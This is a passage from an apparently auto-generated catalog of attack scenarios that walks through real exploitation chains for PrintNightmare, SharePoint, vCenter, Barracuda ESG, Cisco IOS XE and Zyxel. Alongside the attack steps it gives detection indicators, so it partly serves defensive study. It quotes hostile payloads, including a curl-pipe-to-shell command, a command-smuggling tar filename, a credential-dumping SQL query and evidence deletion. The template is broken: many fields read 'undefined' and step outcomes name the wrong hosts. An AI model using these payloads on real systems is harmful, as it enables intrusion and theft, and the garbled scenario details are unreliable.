## 35. Microsoft, Rapid7 & Elastic — Windows "PrintNightmare": RpcAddPrinterDriverEx Remote SYSTEM RCE
- **Scenario ID:** `printnightmare-spooler-cve-2021-34527`
- **Canonical URL:** https://www.attackexplorer.com/scenarios/printnightmare-spooler-cve-2021-34527
- **Category:** Active Directory & Identity (`ACTIVE_DIRECTORY`)
- **Difficulty:** undefined
- **MITRE ATT&CK Techniques:** 
- **CVEs / Advisories:** CVE-2021-34527 (8.8 HIGH / CRITICAL AD RCE)
- **Attributed Threat Actors:** Vice Society, Conti, Magniber & APT Lateral Movement Teams, Sangfor PoC Post-Disclosure Threat Clusters
- **Executive Summary:** undefined
- **Kill-Chain Stages (3):**
  1. **[undefined] undefined** (undefined): Normally localspl.dll checks if the caller is a Server Administrator before installing a printer driver. Setting bit 0x8000 (dwFileCopyFlags = 0x8014) jumps right over the ValidateObjectAccess() check! As reverse-engineered by Rapid7 and security researchers, the Windows Print Spooler (spoolsv.exe, which runs by default as NT AUTHORITY\SYSTEM on all Windows workstations, member servers, and Domain Controllers) exposes the MS-RPRN RPC interface over SMB named pipe \pipe\spoolss. Inside localspl.dll’s SplAddPrinterDriverEx() function, the code checked: if ((dwFileCopyFlags & 0x8000) == 0) { ValidateObjectAccess(...); } (meaning that simply setting the flag APD_INSTALL_WARNED_DRIVER = 0x8000 inside dwFileCopyFlags caused the Print Spooler to skip the administrator permission check completely, CVE-2021-34527). Even after Microsoft patched the legacy MS-RPRN interface in June 2021 (CVE-2021-1675), researchers discovered that the asynchronous RPC interface MS-PAR (RpcAsyncAddPrinterDriver) had the exact same missing check (tracked as CVE-2021-34527). On the diagram, follow Step #1 / Link #1 (#1→ RPCADDPRINTERDRIVEREX / ⇠#1 RESP Flags 0x8014) from Node ① (#1 Low-Privilege Domain User) to Node ② (#2 Core Identity & VLAN Switch), monitored by Node ⑥ (#6 Elastic EDR & SIEM Sensor).
  2. **[undefined] undefined** (undefined): To pass Windows’ driver file checks, the attacker points the main printer driver (pDriverPath) to a real Microsoft UNIDRV.DLL already on the server, while pointing the helper configuration file (pConfigFile) to \\10.10.20.55\share\evil.dll. In the DRIVER_CONTAINER structure sent to RpcAddPrinterDriverEx(), the attacker sets pDriverPath to a genuine Microsoft inbox printer driver already on the target’s disk (such as UNIDRV.DLL so basic driver header checks pass), and sets pConfigFile to a remote SMB UNC path: \\10.10.20.55\share\evil.dll. Because the flags 0x0004 (APD_COPY_ALL_FILES) and 0x0010 (APD_COPY_FROM_DIRECTORY) are also set, spoolsv.exe reaches out over SMB, copies evil.dll into C:\Windows\System32\spool\drivers\x64\3\, and immediately calls LoadLibraryW() on it in memory. When an exploit script calls RpcAddPrinterDriverEx multiple times, Windows moves the previous copy of the DLL into backup numbered subfolders like C:\Windows\System32\spool\drivers\x64\3\Old\1\evil.dll, a classic forensic indicator on disk. In the documented Sysmon EID 7 & 11 exchange from Core Identity & VLAN Switch to Target Server / DC (spoolsv.exe), Target Server / DC (spoolsv.exe) responds with ACK Unsigned DLL (confirming that the SPOOLER UNSIGNED DLL request succeeded on Target Server / DC (spoolsv.exe) and establishing the runtime state required for Step #3 DLLMAIN SYSTEM EXECUTION & DOMAIN CONTROLLER COMPROMISE). On the diagram, follow Step #2 / Link #2 (#2→ SPOOLER UNSIGNED DLL / ⇠#2 ACK Unsigned DLL) from Node ② (#2 Core Identity & VLAN Switch) to Node ③ (#3 Target Server / DC (spoolsv.exe)), monitored by Node ⑥ (#6 Elastic EDR & SIEM Sensor).
  3. **[undefined] undefined** (undefined): The instant spoolsv.exe loads evil.dll to ask about printer settings, the attacker’s DllMain code runs with full SYSTEM privileges on the Domain Controller. The moment spoolsv.exe calls LoadLibraryW() and DrvConvertDevMode() on the copied configuration DLL, the attacker’s DllMain(DLL_PROCESS_ATTACH) routine executes inside the spoolsv.exe process as NT AUTHORITY\SYSTEM (giving the attacker immediate SYSTEM code execution on the target server or Domain Controller to create a new Domain Admin account or launch a reverse shell). Why do security guides recommend disabling the Print Spooler service completely on Domain Controllers? Because a Domain Controller never needs to manage physical office paper printers, and stopping spoolsv.exe eliminates the entire MS-RPRN / MS-PAR attack surface (including both PrintNightmare and SpoolSample). On the diagram, follow Step #3 / Link #3 (#3→ SPOOLSV CHILD SHELL / ⇠#3 ACK SYSTEM RCE) from Node ③ (#3 Target Server / DC (spoolsv.exe)) to Node ④ (#4 Driver DLL Load in spoolsv.exe), monitored by Node ⑥ (#6 Elastic EDR & SIEM Sensor).
- **Primary Authoritative Sources (3):**
  - Microsoft Security Response Center (MSRC) — *Windows Print Spooler Remote Code Execution Vulnerability (CVE-2021-34527 / PrintNightmare)* (`MSRC-CVE-2021-34527`): https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527
  - Rapid7 Emergent Threat Response — *PrintNightmare (CVE-2021-34527): Technical Analysis of MS-RPRN RpcAddPrinterDriverEx Exploitation* (`RAPID7-PRINTNIGHTMARE-2021`): https://www.rapid7.com/blog/post/2021/06/30/printnightmare-cve-2021-1675-remote-code-execution-in-windows-spooler-service/
  - Elastic Security Labs & CISA — *Detecting PrintNightmare via PrintService Operational EventID 316 and Sysmon EventID 7/11* (`CISA-PRINTNIGHTMARE-2021`): https://www.cisa.gov/news-events/alerts/2021/06/30/printnightmare-critical-windows-print-spooler-vulnerability

## 36. STAR Labs, Rapid7 & CISA — Microsoft SharePoint: JWT "alg:none" Auth Bypass to BCS RCE Chain
- **Scenario ID:** `sharepoint-cve-2023-29357-24955-chain`
- **Canonical URL:** https://www.attackexplorer.com/scenarios/sharepoint-cve-2023-29357-24955-chain
- **Category:** Network & C2 Exfiltration (`NETWORK_WEB`)
- **Difficulty:** undefined
- **MITRE ATT&CK Techniques:** 
- **CVEs / Advisories:** CVE-2023-29357 (9.8 CRITICAL), CVE-2023-24955 (7.2 HIGH)
- **Attributed Threat Actors:** Enterprise Intranet & Collaboration Intrusion Operators, STAR Labs SG Vulnerability Research Team
- **Executive Summary:** undefined
- **Kill-Chain Stages (3):**
  1. **[undefined] undefined** (undefined): By setting "alg": "none" (eyJhbGciOiJub25l...) and "isloopback": "true" inside a self-made JWT token, the attacker tricks SharePoint into skipping cryptographic signature verification completely and handing over the list of Site Administrators. As detailed by STAR Labs and Rapid7, the attacker first sends an unauthenticated request with Authorization: Bearer to SharePoint to read the server’s Realm UUID from the HTTP 401 WWW-Authenticate response header. Next, the attacker constructs a JSON Web Token (JWT) whose header specifies {"alg":"none","typ":"JWT"} (Base64 prefix eyJhbGciOiJub25l, instructing the parser that no cryptographic signature is attached) and whose payload includes "isloopback":"true" (a SharePoint-internal claim that tells the token handler to skip verifying the HTTP request’s endpoint URI) and "nameid":"00000003-0000-0ff1-ce00-000000000000". Because CVE-2023-29357 failed to reject the "none" algorithm when reading x5t/metadata tokens, sending this unsigned token to GET /_api/web/siteusers with header X-RequestForceAuthentication: true grants elevated app-level read access and dumps all site administrator accounts! Why is the Base64 string "eyJhbGciOiJub25l" such a reliable network detection signature? Because the ASCII JSON header {"alg":"none" always Base64URL-encodes to that exact 16-character prefix in the Authorization: Bearer header. In the documented HTTP GET / CVE-2023-29357 exchange from Remote SharePoint Exploiter to DMZ Reverse Proxy & SPAN Tap, DMZ Reverse Proxy & SPAN Tap responds with RESP HTTP 200 OK (confirming that the JWT ALG:NONE BYPASS request succeeded on DMZ Reverse Proxy & SPAN Tap and establishing the runtime state required for Step #2 IMPERSONATING THE SHAREPOINT FARM ADMINISTRATOR). On the diagram, follow Step #1 / Link #1 (#1→ JWT ALG:NONE BYPASS / ⇠#1 RESP HTTP 200 OK) from Node ① (#1 Remote SharePoint Exploiter) to Node ② (#2 DMZ Reverse Proxy & SPAN Tap), monitored by Node ⑥ (#6 SIEM & SharePoint ULS Sensor).
  2. **[undefined] undefined** (undefined): Reading the XML response from /_api/web/siteusers, the attacker copies the Farm Administrator’s Windows SID (nameid) and issuer (nii), pastes them into a second "alg": "none" JWT, and becomes the SharePoint Farm Administrator! From the /_api/web/siteusers response, the attacker extracts a Site Collection or Farm Administrator’s UserId.NameId (their Windows Active Directory SID, e.g., s-1-5-21-...-500) and UserId.NameIdIssuer (urn:office:idp:activedirectory). The attacker then mints a second unsigned "alg":"none" JWT placing those two values into the nameid and nii claims (allowing the attacker to impersonate that specific human Administrator on any SharePoint REST API or Central Administration page without knowing their password or passing MFA). Because CVE-2023-29357 only grants SharePoint application-level administrator privileges rather than direct OS command execution, the attacker needs a post-authentication SharePoint RCE primitive (Step 3) to run operating-system commands. In the documented SharePoint ULS OAuth2 exchange from DMZ Reverse Proxy & SPAN Tap to SharePoint Server 2019 (IIS), SharePoint Server 2019 (IIS) responds with ACK Admin Claims (confirming that the ADMIN JWT SPOOFED request succeeded on SharePoint Server 2019 (IIS) and establishing the runtime state required for Step #3 BUSINESS CONNECTIVITY SERVICES (.BDCM) ASSEMBLY RCE (CVE-2023-24955)). On the diagram, follow Step #2 / Link #2 (#2→ ADMIN JWT SPOOFED / ⇠#2 ACK Admin Claims) from Node ② (#2 DMZ Reverse Proxy & SPAN Tap) to Node ③ (#3 SharePoint Server 2019 (IIS)), monitored by Node ⑥ (#6 SIEM & SharePoint ULS Sensor).
  3. **[undefined] undefined** (undefined): Now acting as the SharePoint Farm Admin, the attacker uploads a Business Connectivity Services (.bdcm) catalog file containing a compiled C# DLL (Type="DotNetAssembly"). SharePoint loads that DLL straight into w3wp.exe and runs powershell.exe! Using the forged Farm Administrator JWT, the attacker chains CVE-2023-24955 by uploading a crafted Business Data Connectivity Model (.bdcm) XML file to SharePoint’s Business Connectivity Services (BCS) catalog. Inside the .bdcm XML, the attacker defines a LobSystem with Type="DotNetAssembly" (a BCS feature that allows SharePoint to load a compiled .NET DLL byte stream directly into the w3wp.exe worker process via Assembly.Load() and invoke its methods when an External List or Finder method is queried). The loaded C# method calls System.Diagnostics.Process.Start() to spawn powershell.exe under the high-privilege SharePoint Farm account (CORP\sp_farm). Because the malicious .NET assembly is stored inside the SharePoint SQL database and loaded directly into w3wp.exe memory via Assembly.Load(byte[]), no .aspx webshell file needs to be written to the IIS webroot on disk. In the documented Sysmon EID 1 exchange from SharePoint Server 2019 (IIS) to OAuth2 JWT Admin Context, OAuth2 JWT Admin Context responds with ACK PID 9120 (confirming that the BCS .BDCM SHELL RCE request succeeded on OAuth2 JWT Admin Context and completing the final execution objective of STAR Labs, Rapid7 & CISA, Microsoft SharePoint: JWT "alg:none" Auth Bypass to BCS RCE Chain). On the diagram, follow Step #3 / Link #3 (#3→ BCS .BDCM SHELL RCE / ⇠#3 ACK PID 9120) from Node ③ (#3 SharePoint Server 2019 (IIS)) to Node ④ (#4 OAuth2 JWT Admin Context), monitored by Node ⑥ (#6 SIEM & SharePoint ULS Sensor).
- **Primary Authoritative Sources (3):**
  - STAR Labs SG (Nguyễn Tiến Giang) — *SharePoint Pre-Auth RCE Chain (CVE-2023-29357 & CVE-2023-24955) Technical Writeup* (`STARLABS-CVE-2023-29357`): https://starlabs.sg/blog/2023/09-sharepoint-pre-auth-rce-chain-cve-2023-29357-and-cve-2023-24955/

## 37. Mandiant, VMware & CISA — UNC3886: vCenter vmdird Out-of-Bounds Write & ESXi VIRTUALPITA Backdoor
- **Scenario ID:** `vmware-vcenter-cve-2023-34048-unc3886`
- **Canonical URL:** https://www.attackexplorer.com/scenarios/vmware-vcenter-cve-2023-34048-unc3886
- **Category:** Network & C2 Exfiltration (`NETWORK_WEB`)
- **Difficulty:** undefined
- **MITRE ATT&CK Techniques:** 
- **CVEs / Advisories:** CVE-2023-34048 (9.8 CRITICAL)
- **Attributed Threat Actors:** UNC3886 (China-Nexus Cyber Espionage Group), VIRTUALPITA / VIRTUALSHINE Hypervisor Developers
- **Executive Summary:** undefined
- **Kill-Chain Stages (3):**
  1. **[undefined] undefined** (undefined): The attacker sends a malformed DCERPC network request to vCenter’s directory service (vmdird on port 2012) to overwrite heap memory and run commands as root, and then deletes /var/core/core.vmdird.* crash files to cover their tracks. UNC3886 sends crafted DCERPC packets over TCP port 2012 to the VMware Directory Service daemon (/usr/lib/vmware-vmdir/sbin/vmdird) on the vCenter Server Appliance (VCSA). Due to an out-of-bounds heap write flaw in vmdird’s DCERPC protocol implementation (CVE-2023-34048), the attacker achieves unauthenticated remote code execution as root (UID 0). As Mandiant documented, because heap memory corruption often causes a worker thread of vmdird to crash before or after spawning the attacker’s shell, UNC3886 immediately runs rm -f /var/core/core.vmdird.* (deleting the core dump files on disk so storage alerts and forensic investigators do not see the exploit payload). Even if the attacker deletes the /var/core/core.vmdird.* file from disk, /var/log/vmware/vmdird/ and systemd journal logs still record the unexpected vmdird service exit/restart timestamp. In the documented VCSA Syslog / vmdird exchange from UNC3886 Threat Actor to DMZ Reverse Proxy & SPAN Tap, DMZ Reverse Proxy & SPAN Tap responds with ACK UID 0 (root) (confirming that the VMDIRD DCERPC OOB request succeeded on DMZ Reverse Proxy & SPAN Tap and establishing the runtime state required for Step #2 EXTRACTING & DECRYPTING ESXI "VPXUSER" CREDENTIALS FROM VCDB). On the diagram, follow Step #1 / Link #1 (#1→ VMDIRD DCERPC OOB / ⇠#1 ACK UID 0 (root)) from Node ① (#1 UNC3886 Threat Actor) to Node ② (#2 DMZ Reverse Proxy & SPAN Tap), monitored by Node ⑥ (#6 vSphere Syslog & SIEM Sensor).
  2. **[undefined] undefined** (undefined): vCenter stores the root-level vpxuser password for every ESXi hypervisor inside its local PostgreSQL database (VPX_HOST), and keeps the AES decryption key (symkey.dat) right next to it on the same server! To manage all ESXi hypervisors in the cluster, vCenter automatically creates and maintains a privileged root-equivalent account named vpxuser on every ESXi host. With root access on vCenter, UNC3886 queries the local vPostgreSQL database (psql -U postgres -d VCDB -c "SELECT ip_address, user_name, password FROM VPX_HOST;") and reads /etc/vmware-vpx/ssl/symkey.dat (the local plaintext AES symmetric key file that vCenter uses to encrypt database passwords, allowing the attacker to instantly decrypt the vpxuser password for every ESXi hypervisor in the datacenter). Compromising a single vCenter Server hands the attacker root-equivalent credentials (vpxuser) to every underlying ESXi hypervisor managed by that vCenter instance. In the documented Auditd OPEN / EXECVE exchange from DMZ Reverse Proxy & SPAN Tap to VMware vCenter Server (VCSA), VMware vCenter Server (VCSA) responds with ACK AES-128-CBC (confirming that the DECRYPT VPXUSER request succeeded on VMware vCenter Server (VCSA) and establishing the runtime state required for Step #3 DEPLOYING VIRTUALPITA & VIRTUALPIE VIB BACKDOORS OVER AF_VSOCK). On the diagram, follow Step #2 / Link #2 (#2→ DECRYPT VPXUSER / ⇠#2 ACK AES-128-CBC) from Node ② (#2 DMZ Reverse Proxy & SPAN Tap) to Node ③ (#3 VMware vCenter Server (VCSA)), monitored by Node ⑥ (#6 vSphere Syslog & SIEM Sensor).
  3. **[undefined] undefined** (undefined): Instead of opening a normal TCP port on the ESXi host that a firewall would spot, VIRTUALPITA listens on AF_VSOCK, a virtual internal cable wired directly between the ESXi hypervisor and its guest VMs. Using the decrypted vpxuser credentials, UNC3886 logs into the ESXi hypervisor, lowers its package signature requirement (esxcli software acceptance set --level=CommunitySupported), and installs an unsigned vSphere Installation Bundle (.vib) containing VIRTUALPITA (an ELF64 C backdoor disguised as /usr/libexec/setsyslog or vmsyslogd) and VIRTUALPIE. Crucially, VIRTUALPITA binds to socket family AF_VSOCK (VMware’s Virtual Machine Communication Interface, CID 2, a direct memory-to-memory communication channel between the ESXi hypervisor and its guest Virtual Machines that never touches the physical network card or TCP/IP stack, making the C2 channel completely invisible to network firewalls and NDR sensors). By chaining AF_VSOCK with CVE-2023-20867 (a VMware Tools authentication bypass in vmtoolsd), UNC3886 can push commands and transfer files from the ESXi hypervisor straight into any guest Virtual Machine without a single network packet. On the diagram, follow Step #3 / Link #3 (#3→ VIRTUALPITA VSOCK VIB / ⇠#3 ACK AF_VSOCK CID 2) from Node ③ (#3 VMware vCenter Server (VCSA)) to Node ④ (#4 vPostgreSQL & symkey.dat Extractor), monitored by Node ⑥ (#6 vSphere Syslog & SIEM Sensor).

## 38. Mandiant & CISA — UNC4841: Barracuda ESG .tar Command Injection, SALTWATER & SEASPY Backdoors
- **Scenario ID:** `barracuda-esg-cve-2023-2868-unc4841`
- **Canonical URL:** https://www.attackexplorer.com/scenarios/barracuda-esg-cve-2023-2868-unc4841
- **Category:** Network & C2 Exfiltration (`NETWORK_WEB`)
- **Difficulty:** undefined
- **MITRE ATT&CK Techniques:** 
- **CVEs / Advisories:** CVE-2023-2868 (9.8 CRITICAL)
- **Attributed Threat Actors:** UNC4841 (China-Nexus Espionage Operator), SEASPY / SUBMARINE Appliance Implant Developers
- **Executive Summary:** undefined
- **Kill-Chain Stages (3):**
  1. **[undefined] undefined** (undefined): Without any human user ever receiving or clicking the email, Barracuda’s automated attachment scanner unpacks the .tar file and passes its member filename ('|sh -c ...#) straight into a root Perl shell call. UNC4841 sends an external MIME email over SMTP port 25 containing a specially formatted .tar archive attachment. Before the email ever reaches a user’s inbox, the Barracuda ESG appliance automatically inspects the attachment using a Perl script that extracts the .tar member filenames and passes them into a shell command without escaping single quotes or pipe characters (CVE-2023-2868, where naming a file inside the tar archive '|sh -c "curl ...|sh"# closes the quoted string, pipes into /bin/sh, and comments out the rest of the command, giving the attacker instant zero-click root code execution). Because the vulnerability triggers inside the perimeter email security scanner itself before delivery, even emails addressed to non-existent or bounced recipients could trigger the exploit on unpatched appliances. In the documented SMTP .tar Attachment exchange from UNC4841 SMTP Operator to DMZ Reverse Proxy & SPAN Tap, DMZ Reverse Proxy & SPAN Tap responds with RESP UID 0 (root) (confirming that the TAR FILENAME RCE request succeeded on DMZ Reverse Proxy & SPAN Tap and establishing the runtime state required for Step #2 IMPLANTING "SALTWATER" (BSMTP) & "SEASPY" (PCAP SNIFFER)). On the diagram, follow Step #1 / Link #1 (#1→ TAR FILENAME RCE / ⇠#1 RESP UID 0 (root)) from Node ① (#1 UNC4841 SMTP Operator) to Node ② (#2 DMZ Reverse Proxy & SPAN Tap), monitored by Node ⑥ (#6 CISA YARA & NDR Sensor).
  2. **[undefined] undefined** (undefined): To maintain invisible access, UNC4841 trojanizes the appliance’s real mail daemon (SALTWATER in /usr/sbin/bsmtp) and runs SEASPY (BarracudaMailService), which quietly sniffs eth0 with libpcap for a magic knock packet without opening any new network port. With root access on the appliance, UNC4841 installs two stealthy backdoors analyzed by Mandiant and CISA: (1) SALTWATER (a trojanized replacement for the legitimate Barracuda SMTP daemon /usr/sbin/bsmtp that embeds six RC4-encrypted modules to execute commands, proxy traffic, and intercept emails inside the normal mail process); and (2) SEASPY (a passive C++ backdoor disguised as /usr/sbin/BarracudaMailService that uses the libpcap packet-capture library on interface eth0 to watch all normal TCP port 25 and 587 traffic for a secret magic knock sequence, meaning netstat shows zero extra listening ports on the appliance). Why use a libpcap sniffer (SEASPY) for persistence? Because even if a firewall blocks all ports except SMTP port 25, SEASPY inspects raw Ethernet frames arriving on port 25 before they reach the mail server and wakes up a reverse shell only when the attacker’s magic packet arrives. In the documented CISA MAR YARA Match exchange from DMZ Reverse Proxy & SPAN Tap to Barracuda ESG Appliance, Barracuda ESG Appliance responds with ACK ELF64 Implants (confirming that the SALTWATER & SEASPY request succeeded on Barracuda ESG Appliance and establishing the runtime state required for Step #3 DEEP PERSISTENCE VIA "SUBMARINE" & EMAIL SPOOL EXFILTRATION). On the diagram, follow Step #2 / Link #2 (#2→ SALTWATER & SEASPY / ⇠#2 ACK ELF64 Implants) from Node ② (#2 DMZ Reverse Proxy & SPAN Tap) to Node ③ (#3 Barracuda ESG Appliance), monitored by Node ⑥ (#6 CISA YARA & NDR Sensor).
  3. **[undefined] undefined** (undefined): When Barracuda deployed emergency patch scripts, UNC4841 hid SUBMARINE inside a SQLite database trigger (/mail/config/config.db -> /etc/init.d/ee) so the malware resurrected itself every time the database was read, forcing victims to physically replace the appliance! When defenders and Barracuda deployed remediation patches in May 2023, UNC4841 rapidly adapted by deploying SUBMARINE (a deep-persistence rootkit that plants a malicious SQL TRIGGER inside the appliance’s core SQLite configuration database along with /etc/init.d/ee, so that whenever the appliance reads its database after a reboot or firmware update, SQLite automatically executes the attacker’s shell script as root) and exfiltrated compressed .tar.gz archives of targeted government and diplomatic mailboxes. Because UNC4841 compromised multiple layers of the appliance (SQLite triggers, kernel modules, and device SSL certificates), both Barracuda Networks and CISA issued the rare directive that all compromised ESG appliances must be completely decommissioned and replaced regardless of patch level. On the diagram, follow Step #3 / Link #3 (#3→ SUBMARINE MAIL EXFIL / ⇠#3 RESP 112 MB .tar.gz) from Node ③ (#3 Barracuda ESG Appliance) to Node ④ (#4 SALTWATER & SEASPY Implants), monitored by Node ⑥ (#6 CISA YARA & NDR Sensor).

## 39. Cisco Talos, VulnCheck & CISA — Cisco IOS XE Web UI Zero-Day Chain & "BadCandy" Lua Implant
- **Scenario ID:** `cisco-ios-xe-cve-2023-20198-badimplant`
- **Canonical URL:** https://www.attackexplorer.com/scenarios/cisco-ios-xe-cve-2023-20198-badimplant
- **Category:** Network & C2 Exfiltration (`NETWORK_WEB`)
- **Difficulty:** undefined
- **MITRE ATT&CK Techniques:** 
- **CVEs / Advisories:** CVE-2023-20198 (10.0 CRITICAL), CVE-2023-20273 (7.2 HIGH)
- **Attributed Threat Actors:** Unknown Sophisticated Network Infrastructure Actor, Secondary BadCandy Mutation Operators
- **Executive Summary:** undefined
- **Kill-Chain Stages (3):**
  1. **[undefined] undefined** (undefined): Doubly encoding the letter w as %2577 tricks the outer NGINX proxy into letting the request past its /webui_wsma_http block rule, while the inner WSMA server decodes %77 back to w and runs the attacker’s SOAP CLI command. On Cisco IOS XE switches and routers with the HTTP/HTTPS Web UI enabled (ip http server / ip http secure-server), an NGINX reverse proxy sits in front of the internal Web Services Management Agent (WSMA). NGINX is configured to require authentication for the path /webui_wsma_http. However, by doubly URL-encoding the letter "w" as %2577, requesting POST /%2577ebui_wsma_http, NGINX decodes the URI once to /%77ebui_wsma_http (which does not match the string "/webui_wsma_http", so NGINX skips the authentication check) and proxies the request to the backend WSMA service, which decodes %77 a second time back to "w" and executes the XML SOAP payload (username cisco_support privilege 15 secret ..., CVE-2023-20198). Whenever WSMA executes a CLI configuration command over HTTP, Cisco IOS XE writes a telltale syslog entry: %SYS-5-CONFIG_I: Configured from http by console. In the documented HTTP POST / Syslog CONFIG_I exchange from IOS XE Zero-Day Operator to DMZ Reverse Proxy & SPAN Tap, DMZ Reverse Proxy & SPAN Tap responds with RESP HTTP 200 SOAP (confirming that the DOUBLE-ENCODE WSMA BYPASS request succeeded on DMZ Reverse Proxy & SPAN Tap and establishing the runtime state required for Step #2 INSTALLADD COMMAND INJECTION TO LINUX ROOT (CVE-2023-20273)). On the diagram, follow Step #1 / Link #1 (#1→ DOUBLE-ENCODE WSMA BYPASS / ⇠#1 RESP HTTP 200 SOAP) from Node ① (#1 IOS XE Zero-Day Operator) to Node ② (#2 DMZ Reverse Proxy & SPAN Tap), monitored by Node ⑥ (#6 Cisco Talos / SIEM Sensor).
  2. **[undefined] undefined** (undefined): Having privilege 15 lets you configure router ports in IOS CLI, but doesn’t give you direct access to the underlying Linux filesystem. So the attacker uses their new cisco_support login to trigger a command injection bug in installAdd (CVE-2023-20273) and become Linux root! Cisco IOS XE runs as a daemon (IOSd) on top of an underlying Linux operating system (BinOS). While CVE-2023-20198 gives the attacker an IOS CLI "privilege 15" administrator account, planting a stealthy web backdoor requires Linux root access. Authenticating with the newly created cisco_support account, the attacker sends a crafted JSON POST request to /webui/rest/softwareMgmt/installAdd (CVE-2023-20273, an authenticated OS command injection flaw in the Web UI software installation handler that passes unsanitized parameters to a Linux root shell). When CVE-2023-20273 triggers, the router logs %WEBUI-6-INSTALL_OPERATION_INFO: User: username, Install Operation: ADD right as the attacker’s Linux root commands execute. In the documented IOS XE WebUI / CVE-2023-20273 exchange from DMZ Reverse Proxy & SPAN Tap to Cisco Catalyst / ISR (IOS XE), Cisco Catalyst / ISR (IOS XE) responds with ACK UID 0 (root) (confirming that the INSTALLADD ROOT RCE request succeeded on Cisco Catalyst / ISR (IOS XE) and establishing the runtime state required for Step #3 IMPLANTING THE "BADCANDY" LUA WEBSHELL IN NGINX). On the diagram, follow Step #2 / Link #2 (#2→ INSTALLADD ROOT RCE / ⇠#2 ACK UID 0 (root)) from Node ② (#2 DMZ Reverse Proxy & SPAN Tap) to Node ③ (#3 Cisco Catalyst / ISR (IOS XE)), monitored by Node ⑥ (#6 Cisco Talos / SIEM Sensor).
  3. **[undefined] undefined** (undefined): As Linux root, the attacker writes occo.conf and oregon_http.lua (BadCandy), reloads NGINX so the Lua backdoor lives in RAM, and then deletes the cisco_support user from running-config so admins inspecting the router config see nothing wrong! With Linux root privileges, the attacker writes the BadCandy Lua webshell to /var/scrollable/view/oregon_http.lua, adds an NGINX configuration hook at /usr/binos/conf/nginx-conf/occo.conf (which maps the URL /webui/logoutconfirm.html?logon_hash=1 to execute oregon_http.lua), and sends a SIGHUP signal to nginx so it reloads the Lua script into memory. As VulnCheck documented, the attacker then deletes the temporary cisco_support account from the IOS running-config (so an administrator running show running-config sees no unauthorized users, while the BadCandy Lua backdoor remains active inside NGINX’s memory and allows full root + IOS CLI execution at any time). Because BadCandy resides in volatile filesystem paths (/usr/binos/conf/nginx-conf/occo.conf) that are wiped on a full device reload, rebooting the router clears the implant, provided the admin also disables the Web UI or installs Cisco’s patch so the attacker cannot immediately re-exploit it. On the diagram, follow Step #3 / Link #3 (#3→ BADCANDY LUA IMPLANT / ⇠#3 RESP 18-Char Hex ID) from Node ③ (#3 Cisco Catalyst / ISR (IOS XE)) to Node ④ (#4 WSMA Priv-15 & installAdd RCE), monitored by Node ⑥ (#6 Cisco Talos / SIEM Sensor).
- **Primary Authoritative Sources (3):**
  - Cisco Talos Intelligence Group — *Active Exploitation of Cisco IOS XE Software Web Management User Interface (CVE-2023-20198 & CVE-2023-20273)* (`TALOS-IOSXE-2023-10`): https://blog.talosintelligence.com/active-exploitation-of-cisco-ios-xe-software/

  - CISA & Cisco PSIRT — *CISA Releases Guidance on Cisco IOS XE Web UI Zero-Day Exploitation* (`CISCO-SA-IOSXE-WEBUI-PRIVESC-J22SaA4z`): https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z

## 40. TRAPA Security, Rapid7 & CISA — Zyxel Firewall Pre-Auth IKEv2 Packet Decoder Command Injection
- **Scenario ID:** `zyxel-firewall-cve-2023-28771-ike-rce`
- **Canonical URL:** https://www.attackexplorer.com/scenarios/zyxel-firewall-cve-2023-28771-ike-rce
- **Category:** Network & C2 Exfiltration (`NETWORK_WEB`)
- **Difficulty:** undefined
- **MITRE ATT&CK Techniques:** 
- **CVEs / Advisories:** CVE-2023-28771 (9.8 CRITICAL)
- **Attributed Threat Actors:** Ransomware Initial Access Brokers & Mirai/Gafgyt Operators, Shadowserver Tracked UDP/500 Exploitation Wave

- **Kill-Chain Stages (3):**
  1. **[undefined] undefined** (undefined): To reach the vulnerable logging function in libike.so, the attacker sends a UDP/500 IKE_SA_INIT packet with a Notify payload (Type 14) whose first 48 bytes are encrypted with the static 3DES key extracted from Zyxel’s firmware. As reverse-engineered by TRAPA Security and Rapid7, Zyxel’s VPN key-exchange daemon (/usr/sbin/ssod linked with /lib/libike.so) listens on UDP port 500. When an unauthenticated internet client sends an IKEv2 IKE_SA_INIT packet (Exchange Type 34) containing a Notify payload with Message Type 14 (NO_PROPOSAL_CHOSEN), the function ikev2_fb_Extract_N_Payload() decrypts the first 48 bytes of the notification data using 3DES-CBC with a hardcoded 24-byte key and 8-byte IV baked directly into the firmware binary (meaning any attacker who extracts that key from a public firmware download can craft a valid 48-byte header). Even more remarkably, libike.so only decrypts the first 48 bytes of the Notify payload and leaves all bytes after offset 48 completely unencrypted in plaintext!. In the documented UDP/500 IKEv2 Notify exchange from Remote UDP/500 Exploiter to DMZ Reverse Proxy & SPAN Tap, DMZ Reverse Proxy & SPAN Tap responds with RESP UDP 188 Bytes (confirming that the IKEV2 NOTIFY INJECT request succeeded on DMZ Reverse Proxy & SPAN Tap and establishing the runtime state required for Step #2 BREAKING OUT OF SYSTEM("ECHO ... >> /TMP/SDWAN_VPNDEBUG.LOG")). On the diagram, follow Step #1 / Link #1 (#1→ IKEV2 NOTIFY INJECT / ⇠#1 RESP UDP 188 Bytes) from Node ① (#1 Remote UDP/500 Exploiter) to Node ② (#2 DMZ Reverse Proxy & SPAN Tap), monitored by Node ⑥ (#6 WAN NDR & Syslog SIEM).
  2. **[undefined] undefined** (undefined): Instead of using C’s fopen() and fwrite() to write a debug log line, the developer called system("echo <packet_data> >> /tmp/sdwan_vpndebug.log") as root! To record the SD-WAN VPN debug message, ssod passes the extracted notification string into cmd_string_unescape() and then formats a shell command using snprintf: "echo %s >> /tmp/sdwan_vpndebug.log" (passing that string straight into C’s system() function running as uid=0 root, CVE-2023-28771). By placing "; curl http://198.51.100.233/z.sh | sh ; echo " right after the 48-byte 3DES block in the UDP packet, the attacker closes the echo quote, executes their arbitrary shell command as root, and re-opens the quote cleanly. Why is calling system("echo ...") to write a log file a textbook C anti-pattern? Because invoking /bin/sh -c on network-supplied strings allows shell metacharacters (; |, $()) to execute arbitrary operating-system commands. In the documented ssod system() Exec exchange from DMZ Reverse Proxy & SPAN Tap to Zyxel USG FLEX / ATP Firewall, Zyxel USG FLEX / ATP Firewall responds with ACK UID 0 (root) (confirming that the SDWAN DEBUG LOG RCE request succeeded on Zyxel USG FLEX / ATP Firewall and establishing the runtime state required for Step #3 PERIMETER FIREWALL TAKEOVER & INTERNAL LAN PIVOTING). On the diagram, follow Step #2 / Link #2 (#2→ SDWAN DEBUG LOG RCE / ⇠#2 ACK UID 0 (root)) from Node ② (#2 DMZ Reverse Proxy & 